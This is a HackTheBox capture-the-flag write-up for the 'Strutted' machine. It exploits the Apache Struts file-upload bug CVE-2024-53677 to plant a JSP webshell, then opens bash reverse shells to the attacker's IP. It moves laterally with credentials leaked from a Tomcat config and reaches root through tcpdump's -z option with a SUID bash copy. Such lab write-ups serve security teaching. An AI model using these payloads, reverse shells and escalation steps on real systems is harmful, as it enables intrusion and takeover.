---
title: HTB: Strutted
url: https://0xdf.gitlab.io/2025/01/28/htb-strutted.html
date: 2025-01-28T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-strutted, nmap, upload, java, struts, docker, dockerfile, tomcat, cve-2024-53677, burp, burp-repeater, webshell, su, su-fail, tcpdump, gtfobins
---

![Strutted](/img/strutted-cover.png)

Strutted is a box released directly to retired on HackTheBox highlighting the CVE-2024-53677 vulnerability in Apache Struts that was made public in December 2024. It is a bit tricky to exploit, but I’ll use it to upload a webshell and get a foothold. From there, I’ll use creds from an old Tomcat config to move to the next user, and then abuse tcpdump to get root. In Beyond Root, I’ll show two things that I couldn’t explain while originally solving the box, discovering a new Systemd protection as well as some information about how Tomcat is configured.

## Box Info

| Name | [Strutted](https://hackthebox.com/machines/strutted)  [Strutted](https://hackthebox.com/machines/strutted) [Play on HackTheBox](https://hackthebox.com/machines/strutted) |
| --- | --- |
| Release Date | 23 Jan 2025 |
| Retire Date | 23 Jan 2025 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creators | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053)  [7u9y 7u9y](https://app.hackthebox.com/users/260996) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.59
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 06:36 EST
Nmap scan report for 10.10.11.59
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.59
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 06:36 EST
Nmap scan report for 10.10.11.59
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.72 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

The website returns a redirect to `strutted.htb`. Given the use of domain-based routing, I’ll use `ffuf` to brute force for any subdomains that respond differently, but not find any. I’ll add this to my `hosts` file:

```
10.10.11.59 strutted.htb

```

### Website - TCP 80

#### Site

The site is a image file sharing site:

![image-20250125064822513](/img/image-20250125064822513.png)

At the bottom of the page, there’s a message offering a download of a Docker image showing the platform configuration. Clicking “Download” at the top right downloads `strutted.zip`.

Giving the site an image shows the image plus a button to get the link:

![image-20250125065014050](/img/image-20250125065014050.png)

The copy button doesn’t actually work. It’s not important to solve the box, but I’ll see why looking in the dev tools, finding this error in the console:

![image-20250125065203937](/img/image-20250125065203937.png)

Copying is only accessible via a “secure origin” - either HTTPS or localhost. I’ve actually fought with this error putting copyable links on my own website next to the headers, where it doesn’t work when I load my local version of my page from `0.0.0.0`, but does for `127.0.0.1`.

The link that would be copied if it were working is from the hidden `input` tag in the HTML:

![image-20250125065427425](/img/image-20250125065427425.png)

That URL shows a copy of the image:

![image-20250125065455045](/img/image-20250125065455045.png)

#### Tech Stack

The HTTP response headers show nginx as the server, but also set a `JSESSIONID` immediately on loading `/`:

```

HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 25 Jan 2025 11:45:47 GMT
Content-Type: text/html;charset=UTF-8
Connection: keep-alive
Vary: Sec-Fetch-Dest,Sec-Fetch-Mode,Sec-Fetch-Site,Sec-Fetch-User
Cross-Origin-Embedder-Policy-Report-Only: require-corp
Cross-Origin-Opener-Policy: same-origin
Set-Cookie: JSESSIONID=050FF7206B1F82DE392418CADE3D3ADA; Path=/; HttpOnly
Content-Language: en-US
Content-Length: 5197

```

That says this is a Java-based web application.

Trying to fetch a page that doesn’t exist (`/0xdf`) returns the main page. Interestingly, it is not a redirect to `/`, but rather just the same page as a 200 OK response.

There’s no need to poke at this further or brute force directories as I have the Docker version of the site.

### Docker Download

#### Setup

The download decompresses to four files and a directory:

```

oxdf@hacky$ ls
context.xml  Dockerfile  README.md  strutted  tomcat-users.xml

```

The `Dockerfile` shows how it fits together:

```

FROM --platform=linux/amd64 openjdk:17-jdk-alpine
#FROM openjdk:17-jdk-alpine

RUN apk add --no-cache maven

COPY strutted /tmp/strutted
WORKDIR /tmp/strutted

RUN mvn clean package

FROM tomcat:9.0

RUN rm -rf /usr/local/tomcat/webapps/
RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/
RUN rm -rf /usr/local/tomcat/webapps/ROOT

COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war
COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml
COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml

EXPOSE 8080

CMD ["catalina.sh", "run"]

```

It uses an OpenJDK container to build `strutted-1.0.0.war` using [maven](https://maven.apache.org/), and then copies that into a Tomcat container along with `tomcat-users.xml` and `context.xml`.

`tomcat-users.xml` does seem to have the admin password:

```

<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>

```

However, trying to visit pages like `/manager/html` return [404 from Tomcat](/cheatsheets/404#tomcat):

![image-20250125071228755](/img/image-20250125071228755.png)

#### Application

The `strutted` folder has the application code:

```

oxdf@hacky$ ls
mvnw  mvnw.cmd  pom.xml  src  target

```

`pom.xml` has the version for the various dependencies and plugins, including Apache Struts:

```

...[snip]...
        <struts2.version>6.3.0.1</struts2.version>
...[snip]...
            <dependency>                                   
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-core</artifactId>
                <version>${struts2.version}</version>
            </dependency>                                  
                                                                                                                      
            <dependency>                                   
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-config-browser-plugin</artifactId>
                <version>${struts2.version}</version>
            </dependency> 
...[snip]...

```

I can look at all the source code for the application, which has value for understand how Java applications work, but it isn’t necessary to solve this box.

## Shell as tomcat

### CVE-2024-53677

#### Background

In December 2024, there was a lot of news about a new Struts vulnerability, [CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677), which is described as:

> File upload logic in Apache Struts is flawed. An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. This issue affects Apache Struts: from 2.0.0 before 6.4.0.

The version on Strutted of 6.3.1 falls in this range.

[This post](https://help.tanium.com/bundle/CVE-2024-31497/page/VERT/CVE-2024-53677/Understanding_Apache_Struts.htm) from Tanium does a nice job explaining at a high level how this bug works. Struts has a series of Interceptor classes that run by default, including one called the `FileUploadInterceptor`.

Struts has this concept of the object graph navigation library (OGNL), which has a stack. If there are two objects on the stack, and it allows referencing some property, say `name`, and that will work down the stack looking for the first object that has that property and return that.

If a POST request triggers the `FileUploadInterceptor`, I can have other POST parameters that reference parts of that object by the OGNL stack. In practice, that looks like:

```

POST /upload.action HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=---------------------------31959763281250412790357662404
-----------------------------31959763281250412790357662404
Content-Disposition: form-data; name="Upload"; filename="test.txt"
Content-Type: plaint/text

Hello, World!
-----------------------------31959763281250412790357662404
Content-Disposition: form-data; name="top.UploadFileName"

different.txt
-----------------------------31959763281250412790357662404--

```

The first form data parameter will be processed into an object by the `FileUploadInterceptor`. Then the second parameter is processed, setting the `UploadFileName` for the top of the stack (the first parameter) to this new value. This trick allows for bypassing other rules put in place about where a file can be written, including directory traversals.

One critical thing I figured out through a lot of pain was that for the interceptor to handle the POST request, it must have the name “Upload” (with a capital “U”).

#### POC

There’s a [POC exploit script](https://github.com/EQSTLab/CVE-2024-53677) on from EQSTLab. It doesn’t work for Strutted, but it’s still worth a look. The important part is the `exploit` function:

```

    def exploit(self) -> None:
        files = {
            'Upload': ("exploit_file.jsp", self.file_content, 'text/plain'),
            'top.UploadFileName': (None, self.path),
        }

        try:
            response = requests.post(self.url, files=files)
            print("Status Code:", response.status_code)
            print("Response Text:", response.text)
            if response.status_code == 200:
                print("File uploaded successfully.")
            else:
                print("Failed to upload file.")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

```

It’s going to send a HTTP POST request with form data (using `files` in `requests.post`), sending first the “Upload” parameter and then `top.UploadFileName`.

If I run this on Strutted, giving it a file name to move the file to of `test.txt`, it makes the post request, and reports success, but the HTML shows it didn’t upload:

```

oxdf@hacky$ python CVE-2024-53677.py -u http://strutted.htb/upload.action -p 'test.txt'
...[snip]...
[\] Loading, please wait...
Status Code: 200
Response Text:
...[snip]...
                    <div class="alert alert-danger text-center" role="alert">

                            Only image files can be uploaded!

                    </div>
...[snip]...
File uploaded successfully.

```

It wouldn’t be too hard to update this script to work on Strutted, but I’ll exploit it in Burp Repeater.

### Exploitation

#### Setup

I’ll upload an image and send the request to Burp Repeater. I always like to clean up a the request a bit to make it easier, removing headers and unnecessary data. I’ll send it after each removal to make sure it still works, ending up with something like:

![image-20250126145605998](/img/image-20250126145605998.png)

If it’s successful, there’s an `img` tag here with a link in uploads. I’ve got the Repeater window set to find that string and it set to auto-scroll there so I see it on each request:

![image-20250126145714061](/img/image-20250126145714061.png)

#### Move File

I would like to be able to upload a file with the `.jsp` extension so that I can execute code. Renaming the file results in failure:

![image-20250126145825318](/img/image-20250126145825318.png)

To exploit CVE-2024-53677, I’ll add another parameter:

![image-20250126145950585](/img/image-20250126145950585.png)

Just adding the second parameter didn’t move it. The resulting file is still `lego.png` in the `uploads/[date]/` folder. That’s because the first parameter name is “upload” and not “Upload”, so it isn’t passed to the OGNL interceptor. On updating that, it works:

![image-20250126150117114](/img/image-20250126150117114.png)

If I try to visit `/uploads/shell.jsp`, there’s a file there (though it doesn’t display):

![image-20250126150150159](/img/image-20250126150150159.png)

Because of how the tomcat application is configured (which I’ll show in [Beyond Root](#webshell-location)), it’s still trying to process this file as a static file (Firefox is erroring trying to show it as an invalid image). I’ll try again, this time with a end target of `../../shell.jsp`. It looks better:

![image-20250126150446894](/img/image-20250126150446894.png)

#### Webshell

I’ll grab a JSP webshell ([this one](https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp) works nicely) and paste it after the PNG magic in the request:

![image-20250126150620415](/img/image-20250126150620415.png)

Now there’s a webshell that works at `/shell.jsp`:

![image-20250126150641829](/img/image-20250126150641829.png)

#### Shell

I’ll try some [Bash reverse shells](https://www.youtube.com/watch?v=OjkVep2EIlw) in the command input, but none result in a shell. I’m not surprised, as Java is especially tricky about pipes and redirects in this kind of injection.

I’ll try a base64-encoded version:

```

oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK

```

On entering that, it still doesn’t return a shell. The page shows why:

![image-20250126151254961](/img/image-20250126151254961.png)

The pipes are being included in the string that gets `echo`ed.

I’ll create a simple shell script:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

I’ll use a Python webserver to host this file, and upload it using `wget` in the webshell:

![image-20250126151554945](/img/image-20250126151554945.png)

It gets it from my webserver:

```
10.10.11.59 - - [26/Jan/2025 15:15:59] "GET /shell.sh HTTP/1.1" 200 -

```

And it’s there:

![image-20250126151615059](/img/image-20250126151615059.png)

I’ll run `bash /dev/shm/shell.sh` via the webshell, and the page hangs, but there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.59 48648
bash: cannot set terminal process group (991): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@strutted:~$

```

I’ll upgrade my shell using the [standard technique](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

tomcat@strutted:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
tomcat@strutted:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
tomcat@strutted:~$ 

```

## Shell as james

### Enumeration

#### Users

There is one non-root user with a shell configured:

```

tomcat@strutted:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:Network Administrator:/home/james:/bin/bash

```

They are the only use with a directory in `/home` as well.

```

tomcat@strutted:/home$ ls
james
tomcat@strutted:/home$ cd james/
bash: cd: james/: Permission denied

```

tomcat doesn’t have access.

#### Web

The tomcat user’s home directory is `/var/lib/tomcat9`:

```

tomcat@strutted:~$ pwd
/var/lib/tomcat9
tomcat@strutted:~$ ls
conf  lib  logs  policy  webapps  work

```

The `webapps` directory has the running web application:

```

tomcat@strutted:~$ find webapps/ -type f 
webapps/ROOT.war
webapps/ROOT/META-INF/maven/org.strutted.htb/strutted/pom.xml
webapps/ROOT/META-INF/maven/org.strutted.htb/strutted/pom.properties
webapps/ROOT/META-INF/MANIFEST.MF
webapps/ROOT/META-INF/war-tracker
webapps/ROOT/uploads/20250125_125132/lego.png
...[snip]...
webapps/ROOT/uploads/shell.jsp
webapps/ROOT/shell.jsp
webapps/ROOT/db/url_mappings.db
...[snip]...
webapps/ROOT/WEB-INF/showImage.jsp
webapps/ROOT/WEB-INF/web.xml
webapps/ROOT/WEB-INF/classes/org/strutted/htb/DownloadAction.class
webapps/ROOT/WEB-INF/classes/org/strutted/htb/URLMapping.class
webapps/ROOT/WEB-INF/classes/org/strutted/htb/HowAction.class
webapps/ROOT/WEB-INF/classes/org/strutted/htb/Upload.class
webapps/ROOT/WEB-INF/classes/org/strutted/htb/AboutAction.class
webapps/ROOT/WEB-INF/classes/org/strutted/htb/URLUtil.class
webapps/ROOT/WEB-INF/classes/org/strutted/htb/DatabaseUtil.class
webapps/ROOT/WEB-INF/classes/struts.xml
webapps/ROOT/WEB-INF/about.jsp
webapps/ROOT/WEB-INF/strutted.zip
webapps/ROOT/WEB-INF/upload.jsp
webapps/ROOT/WEB-INF/error.jsp
webapps/ROOT/WEB-INF/how.jsp

```

The `conf` directory has config files:

```

tomcat@strutted:~$ ls conf
Catalina             jaspic-providers.xml  server.xml
catalina.properties  logging.properties    tomcat-users.xml
context.xml          policy.d              web.xml

```

The `tomcat-users.xml` file has a bunch of commented out blocks, including one that seems to have a non-default password:

```

tomcat@strutted:~$ cat conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
...[snip]...
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
...[snip]...
-->
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
<!--
...[snip]...
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>

```

The admin password is “IT14d6SSP81k”.

### su / SSH

The password doesn’t work for the root user. Interestingly, it doesn’t work for james with `su`:

```

tomcat@strutted:~$ su - james    
Password: 
su: Authentication failure

```

But it *does* work for SSH:

```

oxdf@hacky$ sshpass -p 'IT14d6SSP81k' ssh james@strutted.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)
...[snip]...
james@strutted:~$

```

I’ll show why `su` fails in [Beyond Root](#su-failures). I can grab `user.txt`:

```

james@strutted:~$ cat user.txt
6a3550c8************************

```

## Shell as root

### Enumeration

james is able to run `tcpdump` as root:

```

james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump

```

### GTFOBins

#### POC

There’s a `tcpdump` page on [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/):

![image-20250126163435343](/img/image-20250126163435343.png)

When I run this, it doesn’t output anything showing successful execution:

```

james@strutted:~$ COMMAND='id'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel

```

I’ll try a command that leaves something behind:

```

james@strutted:~$ COMMAND='touch /tmp/0xdf'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes

Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ ls -l /tmp/0xdf
-rw-r--r-- 1 root root 0 Jan 26 21:35 /tmp/0xd

```

That worked.

To look at bit more at what it’s doing:
- `-l` - Make STDOUT line buffered. It seems like perhaps the output might come to STDOUT, but I didn’t get that.
- `-n` - Don’t convert addresses to names.
- `-i lo` - Capture on the localhost interface.
- `-w /dev/null` - Save capture to `/dev/null` (throw it away).
- `-W 1 -G 1` - “Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit.” So rotate every second and exit after one file.
- `-z $TF` - Run the `$TF` script on rotation.
- `-Z root` - Run as the root user.

Basically it’s going to force a log rotation and then trigger the command as the post rotation script. It’s not surprising that the output doesn’t print to STDOUT.

#### Shell

To get a shell, I’ll have `tcpdump` create a copy of `bash` and set it as SetUID / SetGID to run as root:

```

james@strutted:~$ COMMAND='cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel

```

It works:

```

james@strutted:~$ ls -l /tmp/0xdf 
-rwsrwsrwx 1 root root 1396520 Jan 26 21:44 /tmp/0xdf
james@strutted:~$ /tmp/0xdf -p
0xdf-5.1#

```

I’ll grab `root.txt`:

```

0xdf-5.1# cat root.txt
f44bc153************************

```

## Beyond Root

### su Failures

#### Background

As tomcat, I am not able to `su - james`, even with the correct password (that does work for SSH). This really confused me, and sent me (and Ippsec) down a rabbit hole.

Looking in `auth.log`, it looks like the password is wrong:

```

Jan 27 14:18:56 localhost unix_chkpwd[1311]: check pass; user unknown
Jan 27 14:18:56 localhost unix_chkpwd[1311]: password check failed for user (james)
Jan 27 14:18:56 localhost su: pam_unix(su-l:auth): authentication failure; logname= uid=998 euid=998 tty=/dev/pts/1 ruser=tomcat rhost=  user=james
Jan 27 14:18:58 localhost su: FAILED SU (to james) tomcat on pts/1

```

I’ll check that the password I have matches what’s in `shadow`:

```

0xdf-5.1# cat /etc/shadow | grep james
james:$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$xoWkrSDF/pC4dkrIlBKe0LpYWCZH4YTz0NJ/zEn8.59:20100:0:99999:7:::
0xdf-5.1# export PASS=IT14d6SSP81k SALT='$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$'
0xdf-5.1# perl -le 'print crypt($ENV{PASS}, $ENV{SALT})'
$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$xoWkrSDF/pC4dkrIlBKe0LpYWCZH4YTz0NJ/zEn8.59

```

I also went down a rabbit hole of trying to use Pam to log the input password (to see if Java or something else was modifying it somehow). IppSec has a [nice video on this](https://www.youtube.com/watch?v=FQGu9jarCWY), but it still turned out to be trickier than expected (likely due to the actual reason). When we did eventually get this working, it showed the correct password was being passed.

#### Service Files

There is a service file in `/etc/systemd/system` named `tomcat.service`:

```

[Unit]
Description=Apache Tomcat Web Application Container
After=network.target
 
[Service]
Type=forking Environment=JAVA_HOME=/usr/lib/jvm/java-1.17.0-openjdk-amd64 Environment=CATALINA_PID=/opt/tomcat/temp/tomcat.pid Environment=CATALINA_HOME=/opt/tomcat Environment=CATALINA_BASE=/opt/tomcat
Environment='CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC'
Environment='JAVA_OPTS=-Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom'
 
ExecStart=/opt/tomcat/bin/startup.sh
ExecStop=/opt/tomcat/bin/shutdown.sh
 
User=tomcat
Group=tomcat
UMask=0007
RestartSec=10
Restart=always
 
[Install]
WantedBy=multi-user.target

```

I don’t believe this file is actually doing anything. If I list the running services, there is no service named `tomcat`, only `tomcat9`:

```

root@strutted:/etc/systemd/system# systemctl list-units --type service --state running 
  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                                                 
  auditd.service              loaded active running Security Auditing Service
  cron.service                loaded active running Regular background program processing daemon
  dbus.service                loaded active running D-Bus System Message Bus
  getty@tty1.service          loaded active running Getty on tty1
  irqbalance.service          loaded active running irqbalance daemon
  ModemManager.service        loaded active running Modem Manager
  multipathd.service          loaded active running Device-Mapper Multipath Device Controller
  networkd-dispatcher.service loaded active running Dispatcher daemon for systemd-networkd
  nginx.service               loaded active running A high performance web server and a reverse proxy server
  open-vm-tools.service       loaded active running Service for virtual machines hosted on VMware
  polkit.service              loaded active running Authorization Manager
  rsyslog.service             loaded active running System Logging Service
  ssh.service                 loaded active running OpenBSD Secure Shell server
  systemd-journald.service    loaded active running Journal Service
  systemd-logind.service      loaded active running User Login Management
  systemd-networkd.service    loaded active running Network Configuration
  systemd-resolved.service    loaded active running Network Name Resolution
  systemd-timesyncd.service   loaded active running Network Time Synchronization
  systemd-udevd.service       loaded active running Rule-based Manager for Device Events and Files
  tomcat9.service             loaded active running Apache Tomcat 9 Web Application Server
  udisks2.service             loaded active running Disk Manager
  user@0.service              loaded active running User Manager for UID 0
  user@1000.service           loaded active running User Manager for UID 1000
  vgauth.service              loaded active running Authentication service for virtual machines hosted on VMware

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
24 loaded units listed.

```

Checking the status of that service, it’s actually running from `/lib/systemd/system`, which is where the package manager installs services:

```

root@strutted:/etc/systemd/system# systemctl status tomcat9
● tomcat9.service - Apache Tomcat 9 Web Application Server
     Loaded: loaded (/lib/systemd/system/tomcat9.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2025-01-27 16:02:19 UTC; 1h 19min ago
       Docs: https://tomcat.apache.org/tomcat-9.0-doc/index.html
    Process: 928 ExecStartPre=/usr/libexec/tomcat9/tomcat-update-policy.sh (code=exited, status=0/SUCCESS)
   Main PID: 945 (java)
      Tasks: 43 (limit: 4564)
     Memory: 209.5M
        CPU: 28.221s
     CGroup: /system.slice/tomcat9.service
             ├─ 945 /usr/lib/jvm/java-17-openjdk-amd64/bin/java -Djava.util.logging.config.file=/var/lib/tomcat9/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.awt.headless=true -Djdk.tls>
             ├─1107 bash /dev/shm/shell.sh
             ├─1108 bash -i
             ├─1110 script /dev/null -c bash
             ├─1111 sh -c bash
             └─1112 bash

Jan 27 16:02:21 strutted tomcat9[945]:     at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:345)
Jan 27 16:02:21 strutted tomcat9[945]:     at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:480)
Jan 27 16:02:21 strutted tomcat9[945]: Deploying web application archive [/var/lib/tomcat9/webapps/ROOT.war]
Jan 27 16:02:25 strutted tomcat9[945]: At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs>
Jan 27 16:02:25 strutted tomcat9[945]: ERROR StatusLogger Log4j2 could not find a logging implementation. Please add log4j-core to the classpath. Using SimpleLogger to log to the console...
Jan 27 16:02:28 strutted tomcat9[945]: Deployment of web application archive [/var/lib/tomcat9/webapps/ROOT.war] has finished in [6,921] ms
Jan 27 16:02:28 strutted tomcat9[945]: Starting ProtocolHandler ["http-nio-127.0.0.1-8080"]
Jan 27 16:02:28 strutted tomcat9[945]: Server startup in [7180] milliseconds
Jan 27 16:03:29 strutted su[1115]: (to james) tomcat on pts/1
Jan 27 16:03:29 strutted su[1115]: pam_unix(su-l:session): session opened for user james(uid=1000) by (uid=998)

```

#### Systemd.exec

The prevention of running `su` as tomcat is a protection put in place by Systemd. The `tomcat9` service is defined as:

```

#
# Systemd unit file for Apache Tomcat
#

[Unit]
Description=Apache Tomcat 9 Web Application Server
Documentation=https://tomcat.apache.org/tomcat-9.0-doc/index.html
After=network.target
RequiresMountsFor=/var/log/tomcat9 /var/lib/tomcat9

[Service]

# Configuration
Environment="CATALINA_HOME=/usr/share/tomcat9"
Environment="CATALINA_BASE=/var/lib/tomcat9"
Environment="CATALINA_TMPDIR=/tmp"
Environment="JAVA_OPTS=-Djava.awt.headless=true"

# Lifecycle
Type=simple
ExecStartPre=+/usr/libexec/tomcat9/tomcat-update-policy.sh
ExecStart=/bin/sh /usr/libexec/tomcat9/tomcat-start.sh
SuccessExitStatus=143
Restart=on-abort

# Logging
SyslogIdentifier=tomcat9

# Security
User=tomcat
Group=tomcat
PrivateTmp=yes
AmbientCapabilities=CAP_NET_BIND_SERVICE
NoNewPrivileges=true
CacheDirectory=tomcat9
CacheDirectoryMode=750
ProtectSystem=strict
ReadWritePaths=/etc/tomcat9/Catalina/
ReadWritePaths=/var/lib/tomcat9/webapps/
ReadWritePaths=/var/log/tomcat9/

[Install]
WantedBy=multi-user.target

```

The “Security” comment has a bunch of stuff defined here, many of which I was not familiar with. The important one for this investigation is `NoNewPrivilege`, which is defined [here](https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html#NoNewPrivileges=):

> Takes a boolean argument. If true, ensures that the service process and all its children can never gain new privileges through `execve()` (e.g. via setuid or setgid bits, or filesystem capabilities). This is the simplest and most effective way to ensure that a process and its children can never elevate privileges again. Defaults to false. In case the service will be run in a new mount namespace anyway and SELinux is disabled, all file systems are mounted with `MS_NOSUID` flag. Also see [No New Privileges Flag](https://docs.kernel.org/userspace-api/no_new_privs.html).
>
> Note that this setting only has an effect on the unit’s processes themselves (or any processes directly or indirectly forked off them). It has no effect on processes potentially invoked on request of them through tools such as [at(1)](https://man7.org/linux/man-pages/man1/at.1.html), [crontab(1)](https://man7.org/linux/man-pages/man1/crontab.1.html), [systemd-run(1)](https://www.freedesktop.org/software/systemd/man/latest/systemd-run.html#), or arbitrary IPC services.
>
> Added in version 187.

That means when I try to run `su`, despite it’s being a SetUID binary to run as root, it will run as tomcat. When it tries to do things like access `shadow` to verify the password, it will fail.

### Webshell Location

When I uploaded a webshell to a directory in`/uploads`, it didn’t work. For example, if I upload the same webshell to both `../../shell.jsp` and `../shell.jsp`, the first works:

```

oxdf@hacky$ curl strutted.htb/shell.jsp?cmd=id -o-
PNG

IHDR·rzU¢gAMA±
îàIEND®B`     üa Y

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)

</pre>
</BODY></HTML>

```

The second has the unprocessed Java code:

```

oxdf@hacky$ curl strutted.htb/uploads/shell.jsp?cmd=id -o-
PNG

IHDRrzUgAMA
IENDB`     a Y
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
